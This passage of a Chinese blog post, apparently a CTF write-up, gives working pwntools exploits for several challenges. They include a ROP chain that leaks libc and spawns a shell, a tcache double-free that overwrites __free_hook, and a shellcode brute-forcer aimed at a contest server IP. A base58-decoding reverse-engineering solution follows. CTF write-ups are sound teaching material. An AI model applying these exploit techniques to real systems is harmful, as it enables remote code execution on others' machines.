class="string">"-1.9999"</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">		inputFloat(<span class="string">"111"</span>)</span><br><span class="line">	inputFloat(<span class="string">"13"</span>)</span><br><span class="line">	inputFloat(<span class="string">"13"</span>)</span><br><span class="line">	inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#0x11</span></span><br><span class="line">	inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#fake</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#rip = 0x4009f3</span></span><br><span class="line">	<span class="comment">#pop_rdi_ret</span></span><br><span class="line">	inputRop(<span class="number">5881041</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#__libc_start_main got</span></span><br><span class="line">	inputRop(<span class="number">8822026</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#puts_plt</span></span><br><span class="line">	inputRop(<span class="number">5879714</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#pop_rdi_ret</span></span><br><span class="line">	inputRop(<span class="number">5881041</span>)</span><br><span class="line">	inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">	inputRop(<span class="number">5881038</span>)</span><br><span class="line">	inputRop(<span class="number">8822106</span>)</span><br><span class="line">	inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#read_plt</span></span><br><span class="line">	inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#pop_rdi_ret</span></span><br><span class="line">	inputRop(<span class="number">5881041</span>)</span><br><span class="line">	inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">	inputRop(<span class="number">5881038</span>)</span><br><span class="line">	inputRop(<span class="number">8822014</span>)</span><br><span class="line">	inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#read_plt</span></span><br><span class="line">	inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#pop_rdi_ret</span></span><br><span class="line">	inputRop(<span class="number">5881041</span>)</span><br><span class="line">	inputRop(<span class="number">8822106</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#read_plt</span></span><br><span class="line">	inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#input()</span></span><br><span class="line">	sh.recvuntil(<span class="string">"plz input your float:"</span>)</span><br><span class="line">	sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"do you want to continue?(y/n)"</span>)</span><br><span class="line">	sh.<span class="built_in">send</span>(<span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line">	__libc_start_main = u64(sh.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">	libc = __libc_start_main - lib.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">	<span class="keyword">system</span> = libc + lib.symbols[<span class="string">'system'</span>]</span><br><span class="line">	binsh = libc + lib.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">	sh.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">	sleep(<span class="number">0.2</span>)</span><br><span class="line">	sh.sendline(p64(<span class="keyword">system</span>))</span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">"__libc_start_main: "</span> + hex(__libc_start_main))</span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">"system: "</span> + hex(<span class="keyword">system</span>))</span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">"binsh: "</span> + hex(binsh))</span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">"libc: "</span> + hex(libc))</span><br><span class="line">	sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10002</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/71.png" alt="71"></p>
<h3 id="Babytcache"><a href="#Babytcache" class="headerlink" title="Babytcache"></a>Babytcache</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 可以看到程序没有开PIE,同时bss中存放了_IO_2_1_stdout_的地址,并且libc2<span class="number">.27</span>有<span class="keyword">double</span> <span class="built_in">free</span>,所以思路就很明确了.有了<span class="keyword">double</span> <span class="built_in">free</span>就可以<span class="built_in">malloc</span> <span class="number">2</span> everywhere,所以这样一的难点在于如何leak libc,通过<span class="keyword">double</span> <span class="built_in">free</span>,可以让fd指向_IO_2_1_stdout_,从而<span class="built_in">malloc</span> <span class="number">2</span> _IO_2_1_stdout_,从而修改write_base来leak libc,之后再<span class="keyword">double</span> <span class="built_in">free</span>去修改free_hook为system,去<span class="built_in">free</span>一个/bin/sh就可以了</span><br></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"47.110.227.208"</span>,<span class="number">10006</span>)</span><br><span class="line"></span><br><span class="line"># CyCTF&#123;Tc4ch3_Att4ck_Is_S1mpl3_R1ght?&#125;</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def add2(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    #sh.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="keyword">delete</span>(<span class="built_in">index</span>):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input the index: '</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'\n'</span>)</span><br><span class="line">    </span><br><span class="line">    add2(<span class="number">0</span>x100,p64(<span class="number">0</span>xfbad1880)+p64(<span class="number">0</span>x0)*<span class="number">3</span>+<span class="string">'\x20\n'</span>)</span><br><span class="line">    libc_base=u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-<span class="number">0</span>x3eb780</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base -&gt; "</span> + hex(libc_base)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="built_in">system</span>=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x10,<span class="string">'/bin/sh\x00\n'</span>) # <span class="built_in">index</span> <span class="number">7</span></span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,<span class="string">'\n'</span>) # <span class="built_in">index</span> <span class="number">8</span></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(<span class="built_in">system</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/90.png" alt="90"></p>
<h3 id="codepwn"><a href="#codepwn" class="headerlink" title="codepwn"></a>codepwn</h3><p>通过逆向可以发现程序将flag存入了内存中,并且我们可以选择flag对应的下标进行对比,可是4字节的shellcode有着限制,并且v5是call shellcode之后的返回值,那么就必须在shellcode中对rax进行赋值操作,可以观察到r9寄存器的大小是跟printf出来的字节数相关,那么就可以通过push r9,pop rax,ret,三个操作来对rax赋值,进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确,接下来就是爆破就完事了</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'CRITICAL'</span></span><br><span class="line"></span><br><span class="line">#context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">def flag_index(<span class="built_in">index</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def code(code):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.send(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(size,content):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'tell me your name size:\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your name:\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="keyword">open</span>(<span class="string">'./pwn4_flag'</span>,<span class="string">'a+'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">index</span> in <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>x1,<span class="number">0</span>x7f):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>=remote(<span class="string">'47.110.227.208'</span>,<span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">            #sh=process(<span class="string">'./pwn4'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'this is my gift for you, take it!\n'</span>)</span><br><span class="line"></span><br><span class="line">            flag_index(<span class="built_in">index</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'input your code:\n'</span>)</span><br><span class="line"></span><br><span class="line">            code(<span class="string">'AQX\xC3'</span>)</span><br><span class="line"></span><br><span class="line">            padding=<span class="string">'a'</span>.ljust(i,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">            name(<span class="number">0</span>x100,padding)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'Hello are you ready? '</span>+padding+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.sendline()</span><br><span class="line"></span><br><span class="line">            info = <span class="keyword">sh</span>.recv()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>((info).<span class="keyword">find</span>(<span class="string">'bye!'</span>) != -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">                <span class="keyword">print</span>  chr(i+<span class="number">0</span>x16)</span><br><span class="line"></span><br><span class="line">                flag.<span class="keyword">write</span>(chr(i+<span class="number">0</span>x16))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">except KeyboardInterrup<span class="variable">t:</span></span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">excep<span class="variable">t:</span></span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/87.png" alt="87"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>（emmm这一题偷懒了），</p>
<p>首先分析主函数</p>
<p>里面有两个check函数。进入checktime（）函数，关键代码是这里，</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> *(&amp;v5 + i) = rand();</span><br><span class="line">if ( <span class="number">14766</span> * v11 + <span class="number">18242</span> * v10 + <span class="number">4657</span> * v9 + <span class="number">22453</span> * v8 + <span class="number">7236</span> * v7 + <span class="number">28554</span> * v6 + <span class="number">25606</span> * v5 + <span class="number">12289</span> * v12 == <span class="number">12977737</span></span><br><span class="line">  &amp;&amp; <span class="number">27429</span> * v11 + <span class="number">8015</span> * v10 + <span class="number">16511</span> * v9 + <span class="number">17180</span> * v8 + <span class="number">27141</span> * v7 + <span class="number">31813</span> * v6 + <span class="number">7412</span> * v5 + <span class="number">18249</span> * v12 == <span class="number">15081473</span></span><br><span class="line">  &amp;&amp; <span class="number">2846</span> * v11 + <span class="number">28353</span> * v10 + <span class="number">19864</span> * v9 + <span class="number">27377</span> * v8 + <span class="number">9006</span> * v7 + <span class="number">13657</span> * v6 + <span class="number">19099</span> * v5 + <span class="number">25835</span> * v12 == <span class="number">13554960</span></span><br><span class="line">  &amp;&amp; <span class="number">1078</span> * v11 + <span class="number">5007</span> * v10 + <span class="number">6568</span> * v9 + <span class="number">23034</span> * v8 + <span class="number">10150</span> * v7 + <span class="number">22949</span> * v6 + <span class="number">32646</span> * v5 + <span class="number">15255</span> * v12 == <span class="number">11284005</span></span><br><span class="line">  &amp;&amp; <span class="number">8010</span> * v11 + <span class="number">15430</span> * v10 + <span class="number">6657</span> * v9 + <span class="number">1009</span> * v8 + <span class="number">25691</span> * v7 + <span class="number">15960</span> * v6 + <span class="number">19493</span> * v5 + <span class="number">29491</span> * v12 == <span class="number">10759932</span></span><br><span class="line">  &amp;&amp; <span class="number">4605</span> * v11 + <span class="number">14468</span> * v10 + <span class="number">5017</span> * v9 + <span class="number">12805</span> * v8 + <span class="number">22973</span> * v7 + <span class="number">30584</span> * v6 + <span class="number">12620</span> * v5 + <span class="number">32085</span> * v12 == <span class="number">12085266</span></span><br><span class="line">  &amp;&amp; <span class="number">7478</span> * v11 + <span class="number">6524</span> * v10 + <span class="number">25994</span> * v9 + <span class="number">16215</span> * v8 + <span class="number">12864</span> * v7 + <span class="number">20574</span> * v6 + <span class="number">8882</span> * v5 + <span class="number">14794</span> * v12 == <span class="number">11323393</span></span><br><span class="line">  &amp;&amp; <span class="number">15263</span> * v11 + <span class="number">8821</span> * v10 + <span class="number">25489</span> * v9 + <span class="number">9598</span> * v8 + <span class="number">26847</span> * v7 + <span class="number">5175</span> * v6 + <span class="number">6515</span> * v5 + <span class="number">27411</span> * v12 == <span class="number">11677607</span> )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p>一共8位字符，猜测前5位为<strong>flag{</strong>然后解个方程（也可以直接遍历后三个字符的所有可能，找到符合判断条件的）</p>
<p>得到    flag{Th3</p>
<p>然后来到关键的check函数，看到这里，</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line"> &#123;</span><br><span class="line">   for ( j = 0; !v12[j]; ++j )</span><br><span class="line">     ;</span><br><span class="line">  <span class="built_in"> if </span>( j &gt;= v11 )</span><br><span class="line">     break;</span><br><span class="line">   v9 = 0;</span><br><span class="line">   while ( j &lt; v11 )</span><br><span class="line">   &#123;</span><br><span class="line">     v1 = (v9 &lt;&lt; 8) + v12[j];</span><br><span class="line">     v12[j] = v1 / 58;</span><br><span class="line">     v9 = v1 % 58;</span><br><span class="line">     ++j;</span><br><span class="line">   &#125;</span><br><span class="line">   v2 = v5++;</span><br><span class="line">   s[v2] = v9;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>再加上用来取值的table  123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy</p>
<p>意识到这是可能是个改变密码表的base58编码变形，于是偷懒，百度找了一个base58的编码解码脚本，改变密码表，</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$encode = <span class="string">"fQcoNZxMvNxAVW7UJh5vQNyyuaphLAGo8g"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>.$encode;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$decode = base58_decode($encode);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>.$decode;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">base58_encode</span><span class="params">($string)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $alphabet = <span class="string">'123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'</span>;</span></span><br><span class="line"><span class="php">    $base = strlen($alphabet);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_string($string) === <span class="keyword">false</span> || !strlen($string)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $bytes = array_values(unpack(<span class="string">'C*'</span>, $string));</span></span><br><span class="line"><span class="php">    $decimal = $bytes[<span class="number">0</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($bytes); $i &lt; $l; ++$i) &#123;</span></span><br><span class="line"><span class="php">        $decimal = bcmul($decimal, <span class="number">256</span>);</span></span><br><span class="line"><span class="php">        $decimal = bcadd($decimal, $bytes[$i]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $output = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">while</span> ($decimal &gt;= $base) &#123;</span></span><br><span class="line"><span class="php">        $div = bcdiv($decimal, $base, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">        $mod = bcmod($decimal, $base);</span></span><br><span class="line"><span class="php">        $output .= $alphabet[$mod];</span></span><br><span class="line"><span class="php">        $decimal = $div;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($decimal &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">        $output .= $alphabet[$decimal];</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $output = strrev($output);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> (string) $output;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">base58_decode</span><span class="params">($base58)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $alphabet = <span class="string">'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'</span>;</span></span><br><span class="line"><span class="php">    $base = strlen($alphabet);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_string($base58) === <span class="keyword">false</span> || !strlen($base58)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $indexes = array_flip(str_split($alphabet));</span></span><br><span class="line"><span class="php">    $chars = str_split($base58);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($chars <span class="keyword">as</span> $char) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>($indexes[$char]) === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $decimal = $indexes[$chars[<span class="number">0</span>]];</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($chars); $i &lt; $l; ++$i) &#123;</span></span><br><span class="line"><span class="php">        $decimal = bcmul($decimal, $base);</span></span><br><span class="line"><span class="php">        $decimal = bcadd($decimal, $indexes[$chars[$i]]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $output = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">while</span> ($decimal &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">        $byte = bcmod($decimal, <span class="number">256</span>);</span></span><br><span class="line"><span class="php">        $output = pack(<span class="string">'C'</span>, $byte).$output;</span></span><br><span class="line"><span class="php">        $decimal = bcdiv($decimal, <span class="number">256</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $output;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>解码得到</p>
<p>_sEcond_Be5t_Time_1s_n0w} </p>
<p>flag到手</p>
<p>后来发现，拿这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check time（）函数。。。</p>

      
    </div>
    <footer class="article-footer">
